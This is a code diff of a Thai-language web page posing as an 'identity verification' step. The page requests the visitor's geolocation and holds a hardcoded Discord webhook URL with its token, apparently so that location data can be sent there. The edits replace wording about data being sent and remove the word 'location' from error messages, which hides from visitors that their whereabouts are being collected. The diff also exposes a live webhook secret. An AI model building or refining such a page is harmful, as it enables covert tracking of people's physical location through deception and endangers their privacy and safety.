@@ -63,7 +63,7 @@
 <body>
   <h2>📍 ยืนยันตัวตน</h2>
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
-  <p id="status">ยังไม่มีการส่งข้อมูล</p>
+  <p id="status">ยังไม่มีการยืนยัน</p>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
@@ -120,13 +120,13 @@
       let msg = "";
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          msg = "ผู้ใช้ปฏิเสธการแชร์ตำแหน่ง";
+          msg = "ผู้ใช้ปฏิเสธ";
           break;
         case error.POSITION_UNAVAILABLE:
-          msg = "ไม่สามารถระบุตำแหน่งได้";
+          msg = "ไม่สามารถระบุได้";
           break;
         case error.TIMEOUT:
-          msg = "หมดเวลาในการระบุตำแหน่ง";
+          msg = "หมดเวลาในการระบุ";
           break;
         default:
           msg = error.message;
